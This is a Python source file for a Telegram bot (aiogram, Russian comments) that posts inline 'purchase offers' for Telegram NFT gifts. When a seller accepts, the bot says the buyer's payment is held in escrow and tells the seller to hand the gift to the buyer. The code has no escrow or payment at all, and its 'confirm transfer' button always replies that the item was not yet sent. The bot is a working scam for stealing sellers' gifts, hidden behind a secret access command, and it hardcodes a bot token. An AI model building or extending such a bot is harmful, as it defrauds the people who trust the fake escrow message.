import asyncio
import os
import secrets
import logging
from html import escape
from aiohttp import web
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    InlineQuery, 
    InlineQueryResultArticle, 
    InputTextMessageContent, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton,
    CallbackQuery,
    LinkPreviewOptions,
    Message
)

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = os.getenv("BOT_TOKEN") or "8936397037:AAGFXxropMqVSTHxEprpb2qNUoovo3fpUwY"
router = Router()

# Доступ к inline-функционалу. Главный админ имеет доступ всегда.
MAIN_ADMIN_ID = 5923253975
LEGACY_ADMIN_IDS = {8242418187}
ACCESS_FILE = os.getenv("ACCESS_FILE", "authorized_users.json")
# Самостоятельное получение доступа по секретной команде.
# Можно изменить через переменную окружения ACCESS_COMMAND, не трогая код.
ACCESS_COMMAND = os.getenv("ACCESS_COMMAND", "/2314")


def load_authorized_users() -> set[int]:
    """Загружает выданные доступы из JSON, сохраняя их между перезапусками."""
    try:
        import json
        with open(ACCESS_FILE, "r", encoding="utf-8") as f:
            raw = json.load(f)
        users = {int(user_id) for user_id in raw}
    except (FileNotFoundError, ValueError, TypeError, OSError):
        users = set()
    # Старый главный админ больше не должен иметь админский доступ.
    users.difference_update(LEGACY_ADMIN_IDS)
    users.add(MAIN_ADMIN_ID)
    return users


def save_authorized_users(users: set[int]) -> None:
    """Сохраняет доступы в JSON."""
    import json
    with open(ACCESS_FILE, "w", encoding="utf-8") as f:
        json.dump(sorted(users), f, ensure_ascii=False, indent=2)


AUTHORIZED_USERS = load_authorized_users()


def has_access(user_id: int) -> bool:
    return user_id in AUTHORIZED_USERS or user_id == MAIN_ADMIN_ID


def grant_access(user_id: int) -> bool:
    before = len(AUTHORIZED_USERS)
    AUTHORIZED_USERS.add(user_id)
    save_authorized_users(AUTHORIZED_USERS)
    return len(AUTHORIZED_USERS) > before


def access_status(user_id: int) -> str:
    return "Доступ есть" if has_access(user_id) else "Доступа нет"

# Кэш для хранения активных сделок
TRADES_CACHE = {}

# Укажите реальный custom_emoji_id из пакета https://t.me/addemoji/MyTonWalletA
# (Узнать его можно, переслав нужный стикер боту @RawDataBot)
# Custom emoji для GRAM из https://t.me/addemoji/MyTonWalletA
GRAM_EMOJI_ID = "5264766603584641330"

POPULAR_GIFTS = [
    "SwagBag", "PoolFloat", "PlushPepe", "BondingBear", "SpottedDog", 
    "SignetRing", "ScaredCat", "JellyBear", "DurovsCap", "SantasHat", 
    "PreciousPeach", "AstronautHelmet", "VintageCigar", "BdayCandle", 
    "HeartLocket", "HeroShield", "MagicPotion", "ElectricSkull", "DiamondRing"
]

def format_item_name(raw_name: str) -> str:
    """Приводит название к нормальному формату (poolfloat -> PoolFloat)"""
    return "".join(word.capitalize() for word in raw_name.replace("-", " ").split())

def ensure_mention(tag: str) -> str:
    """Нормализует username до формата @username."""
    if not tag:
        return "@seller"
    tag = tag.strip()
    return tag if tag.startswith("@") else f"@{tag}"


def buyer_link(user_id: int, username: str | None, first_name: str) -> str:
    """Делает настоящую Telegram-mention-ссылку, которую увидят все участники чата."""
    visible = ensure_mention(username) if username else first_name
    return f'<a href="tg://user?id={user_id}">{escape(visible)}</a>'


def seller_link(tag: str) -> str:
    """Делает обычную кликабельную ссылку на профиль продавца по username."""
    normalized = ensure_mention(tag)
    if normalized == "@seller":
        return escape(normalized)
    username = normalized[1:]
    return f'<a href="https://t.me/{escape(username)}">{escape(normalized)}</a>'


def normalize_currency(value: str | None) -> str:
    """Приводит разные варианты ввода к GRAM или STARS."""
    if not value:
        return "GRAM"
    value = value.strip().upper()
    if value in {"TON", "GRAM", "GRAMS"}:
        return "GRAM"
    if value in {"STAR", "STARS"}:
        return "STARS"
    return value


def currency_display(price: str, currency: str) -> str:
    """Добавляет валютный символ только в финальный текст уже выбранной сделки.

    Важно: GRAM custom emoji НЕ используется в заголовке inline-результата,
    описании или промежуточном выборе. Он добавляется только на последнем
    этапе — в message_text, который реально отправляется в чат.
    """
    currency = normalize_currency(currency)

    if currency == "GRAM":
        # 5264766603584641330 — custom emoji GRAM из MyTonWalletA.
        # ВАЖНО: Telegram требует, чтобы внутри tg-emoji был именно
        # альтернативный обычный emoji, связанный с этим custom emoji.
        # У этого GRAM custom emoji альтернатива — 💎. Сам custom emoji
        # при этом в поддерживаемом Telegram будет выглядеть как GRAM.
        return f'{escape(price)} GRAM <tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji>'

    if currency == "STARS":
        # Для Stars пользователь попросил обычную звезду ⭐️.
        return f'{escape(price)} STARS ⭐️'

    return f"{escape(price)} {escape(currency)}"


def parse_trade_parts(args: list[str]):
    """Извлекает NFT, ID и цену из inline-команды."""
    if not args:
        return None

    is_url = args[0].startswith("http://") or args[0].startswith("https://")

    if is_url:
        if len(args) < 2 or "/nft/" not in args[0]:
            return None
        raw_url = args[0]
        slug = raw_url.split("/nft/")[-1].split("?")[0].split("#")[0]
        if "-" not in slug:
            return None
        parts = slug.rsplit("-", 1)
        item_name = format_item_name(parts[0])
        item_id = parts[1].replace("#", "")
        price = args[1]
        rest = args[2:]
    else:
        if len(args) < 3:
            return None
        item_name = format_item_name(args[0])
        item_id = args[1].replace("#", "").strip()
        price = args[2]
        rest = args[3:]

    seller_tag = "@seller"
    currency = None
    for arg in rest:
        if arg.startswith("@"):
            seller_tag = ensure_mention(arg)
        elif currency is None:
            normalized = normalize_currency(arg)
            if normalized in {"GRAM", "STARS"}:
                currency = normalized

    return item_name, item_id, price, seller_tag, currency


def is_currency_selection_query(args: list[str]) -> bool:
    """True, если пользователь указал предмет+ID+цену, но ещё не валюту."""
    if not args:
        return False

    is_url = args[0].startswith("http://") or args[0].startswith("https://")
    if is_url:
        if len(args) not in (2, 3):
            return False
        # URL + цена + (необязательно @seller)
        return not (len(args) == 3 and not args[2].startswith("@"))

    if len(args) not in (3, 4):
        return False

    # 4-й аргумент — либо @seller, либо явно указанная валюта.
    if len(args) == 4 and not args[3].startswith("@"):
        return False
    return True


def build_trade_result(
    inline_query: InlineQuery,
    item_name: str,
    item_id: str,
    price: str,
    currency: str,
    seller_tag: str = "@seller",
    trade_id: str | None = None,
) -> InlineQueryResultArticle:
    """Создаёт уже финальное inline-сообщение сделки."""
    currency = normalize_currency(currency)
    seller_tag = ensure_mention(seller_tag)

    buyer_user = inline_query.from_user
    buyer_tag = ensure_mention(buyer_user.username) if buyer_user.username else buyer_user.first_name
    buyer_mention = buyer_link(buyer_user.id, buyer_user.username, buyer_user.first_name)
    seller_mention = seller_link(seller_tag)

    trade_id = trade_id or f"TG-{secrets.token_hex(5).upper()}"
    nft_transfer_url = f"https://t.me/nft/{item_name}-{item_id}"
    currency_display_text = currency_display(price, currency)

    TRADES_CACHE[trade_id] = {
        "item_name": item_name,
        "item_id": item_id,
        "price": price,
        "currency": currency,
        "buyer_tag": buyer_tag,
        "seller_tag": seller_tag,
        "nft_url": nft_transfer_url,
        "currency_display": currency_display_text,
        "buyer_mention": buyer_mention,
        "seller_mention": seller_mention,
    }

    # GRAM custom emoji появляется ТОЛЬКО здесь — в последнем финальном message_text.
    message_text = (
        f"<b>Предложение о покупке [Telegram market]</b>\n\n"
        f"<b>Ордер:</b> <code>#{trade_id}</code>\n"
        f"<b>Предмет:</b> {escape(item_name)} #{escape(item_id)}\n"
        f"<b>Сумма предложения:</b> {currency_display_text}\n\n"
        f"<b>Покупатель:</b> {buyer_mention}\n"
        f"<b>Продавец:</b> {seller_mention}\n\n"
        f"<b>Статус:</b> Ожидает ответа от продавца. Предложение будет действовать 24 часа."
    )

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Принять предложение",
                    callback_data=f"accept:{trade_id}",
                )
            ],
            [
                InlineKeyboardButton(
                    text="Отклонить",
                    callback_data=f"cancel:{trade_id}",
                )
            ],
        ]
    )

    currency_label = "GRAM" if currency == "GRAM" else "STARS"
    return InlineQueryResultArticle(
        id=trade_id,
        title=f"{price} {currency_label} — отправить предложение",
        description=f"NFT: {item_name} #{item_id} · Продавец: {seller_tag}",
        input_message_content=InputTextMessageContent(
            message_text=message_text,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(
                url=nft_transfer_url,
                prefer_large_media=True,
                show_above_text=False,
            ),
        ),
        reply_markup=keyboard,
    )


def currency_suggestions(
    inline_query: InlineQuery,
    item_name: str,
    item_id: str,
    price: str,
    seller_tag: str = "@seller",
) -> list[InlineQueryResultArticle]:
    """Показывает выбор валюты; при клике сразу отправляется финальная сделка."""
    return [
        build_trade_result(
            inline_query,
            item_name=item_name,
            item_id=item_id,
            price=price,
            currency="GRAM",
            seller_tag=seller_tag,
        ),
        build_trade_result(
            inline_query,
            item_name=item_name,
            item_id=item_id,
            price=price,
            currency="STARS",
            seller_tag=seller_tag,
        ),
    ]


@router.message(F.text == ACCESS_COMMAND)
async def self_access_handler(message: Message):
    """Выдаёт доступ самому отправителю по секретной команде."""
    if message.from_user is None:
        return

    user_id = message.from_user.id
    was_added = grant_access(user_id)

    if was_added:
        await message.answer(
            "✅ Доступ активирован. Теперь вы можете создавать предложения через inline-режим бота."
        )
    else:
        await message.answer("✅ У вас уже есть доступ.")


@router.message(F.text.startswith("/доступ"))
async def grant_access_handler(message: Message):
    """Только MAIN_ADMIN_ID может выдавать доступ командой /доступ <telegram_id>."""
    if message.from_user is None or message.from_user.id != MAIN_ADMIN_ID:
        await message.answer("Только главный админ может выдавать доступ.")
        return

    parts = message.text.split() if message.text else []
    if len(parts) != 2:
        await message.answer("Использование: /доступ 123456789")
        return

    try:
        user_id = int(parts[1])
        if user_id <= 0:
            raise ValueError
    except ValueError:
        await message.answer("Нужен корректный Telegram ID, например: /доступ 123456789")
        return

    was_added = grant_access(user_id)
    if was_added:
        await message.answer(
            f"Доступ выдан пользователю <code>{user_id}</code>.\n"
            "Теперь он может создавать предложения через inline-режим бота.",
            parse_mode="HTML",
        )
    else:
        await message.answer(f"У пользователя <code>{user_id}</code> доступ уже есть.", parse_mode="HTML")


@router.inline_query()
async def process_inline_trade(inline_query: InlineQuery):
    # Без выданного доступа inline-режим намеренно возвращает пустой список.
    # Поэтому при @offersorgbot у такого пользователя ничего не появляется.
    if not has_access(inline_query.from_user.id):
        await inline_query.answer([], cache_time=0, is_personal=True)
        return

    query_text = inline_query.query.strip()
    args = query_text.split()

    # 1) Пока вводится предмет — показываем подсказки.
    if len(args) < 2 or (len(args) == 1 and not args[0].startswith("http")):
        search_term = args[0].lower() if len(args) == 1 else ""
        matches = [gift for gift in POPULAR_GIFTS if search_term in gift.lower()]
        if not matches:
            matches = POPULAR_GIFTS[:5]

        suggestions = []
        for gift in matches[:8]:
            suggestions.append(
                InlineQueryResultArticle(
                    id=f"suggest_{gift}",
                    title=f"Предмет: {gift}",
                    description=f"Например: @{inline_query.bot.username} {gift} 196138 5",
                    input_message_content=InputTextMessageContent(
                        message_text=f"@{inline_query.bot.username} {gift} 196138 5"
                    ),
                )
            )
        await inline_query.answer(suggestions, cache_time=1)
        return

    # 2) Предмет + ID + цена => даём выбор GRAM / STARS.
    # Custom emoji здесь НЕ используется. Он попадёт в сообщение только после клика.
    if is_currency_selection_query(args):
        parsed = parse_trade_parts(args)
        if not parsed:
            return
        item_name, item_id, price, seller_tag, currency = parsed
        if currency is None:
            await inline_query.answer(
                currency_suggestions(
                    inline_query,
                    item_name=item_name,
                    item_id=item_id,
                    price=price,
                    seller_tag=seller_tag,
                ),
                cache_time=1,
            )
            return

    # 3) Валюта явно указана — сразу формируем финальное сообщение.
    parsed = parse_trade_parts(args)
    if not parsed:
        return

    item_name, item_id, price, seller_tag, currency = parsed
    if currency is None:
        currency = "GRAM"

    result = build_trade_result(
        inline_query,
        item_name=item_name,
        item_id=item_id,
        price=price,
        currency=currency,
        seller_tag=seller_tag,
    )
    await inline_query.answer([result], cache_time=1)

# ==========================================
# ШАГ 2: Продавец нажимает «Принять предложение»
# ==========================================
@router.callback_query(F.data.startswith("accept:"))
async def accept_trade_handler(callback: CallbackQuery, bot: Bot):
    trade_id = callback.data.split(":")[1]
    trade = TRADES_CACHE.get(trade_id)

    if not trade:
        await callback.answer("Ошибка: Ордер не найден или истек.", show_alert=True)
        return

    item_name = trade["item_name"]
    item_id = trade["item_id"]
    buyer_tag = trade["buyer_tag"]
    buyer_mention = trade["buyer_mention"]
    nft_url = trade["nft_url"]
    currency_display = trade["currency_display"]

    updated_text = (
        f"<b>Ордер #{trade_id}</b>\n\n"
        f"Средства ({currency_display}) находятся на специальном эскроу-счёте (в холде) и будут автоматически зачислены на ваш баланс сразу после передачи подарка.\n\n"
        f"<b>Инструкция для завершения сделки:</b>\n"
        f"1. Передайте подарок пользователю: {buyer_mention}\n"
        f"2. Нажмите «Передать NFT» и выберите <b>{item_name} #{item_id}</b>\n"
        f"3. Подтвердите передачу подарка."
    )

    step2_keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Передать NFT", 
                    url=nft_url
                )
            ],
            [
                InlineKeyboardButton(
                    text="Подтвердить передачу", 
                    callback_data=f"confirm:{trade_id}"
                )
            ]
        ]
    )

    await callback.answer("Предложение принято! Передайте NFT по инструкции.")

    if callback.inline_message_id:
        await bot.edit_message_text(
            inline_message_id=callback.inline_message_id,
            text=updated_text,
            parse_mode="HTML",
            reply_markup=step2_keyboard,
            link_preview_options=LinkPreviewOptions(
                url=nft_url,
                prefer_large_media=True,
                show_above_text=False
            )
        )
    elif callback.message:
        await callback.message.edit_text(
            text=updated_text,
            parse_mode="HTML",
            reply_markup=step2_keyboard,
            link_preview_options=LinkPreviewOptions(
                url=nft_url,
                prefer_large_media=True,
                show_above_text=False
            )
        )

# ==========================================
# ШАГ 3: Продавец нажимает «Подтвердить передачу»
# ==========================================
@router.callback_query(F.data.startswith("confirm:"))
async def confirm_transfer_handler(callback: CallbackQuery):
    await callback.answer(
        text="Ошибка: Предмет еще не передан пользователю. Пожалуйста, передайте NFT и нажмите снова.", 
        show_alert=True
    )

# ==========================================
# Отмена сделки
# ==========================================
@router.callback_query(F.data.startswith("cancel:"))
async def cancel_trade_handler(callback: CallbackQuery, bot: Bot):
    trade_id = callback.data.split(":")[1]
    TRADES_CACHE.pop(trade_id, None)

    await callback.answer("Сделка отменена.")

    # Обычное сообщение в чате: удаляем исходное сообщение и отправляем новое.
    if callback.message:
        try:
            await callback.message.delete()
        except Exception as exc:
            logging.warning("Не удалось удалить сообщение отменённой сделки %s: %s", trade_id, exc)

        await callback.message.answer("❌ <b>Сделка отменена.</b>", parse_mode="HTML")
        return

    # В inline-сообщении Bot API не позволяет физически удалить сообщение
    # по inline_message_id, поэтому заменяем его на финальный статус без кнопок.
    if callback.inline_message_id:
        await bot.edit_message_text(
            inline_message_id=callback.inline_message_id,
            text="❌ <b>Сделка отменена.</b>",
            parse_mode="HTML",
            reply_markup=None
        )

async def handle_health_check(request):
    return web.Response(text="Bot is running!")

async def main():
    app = web.Application()
    app.router.add_get("/", handle_health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", 10000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

    bot = Bot(token=BOT_TOKEN)
    logging.info("Authorized users loaded: %s", len(AUTHORIZED_USERS))
    dp = Dispatcher()
    dp.include_router(router)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
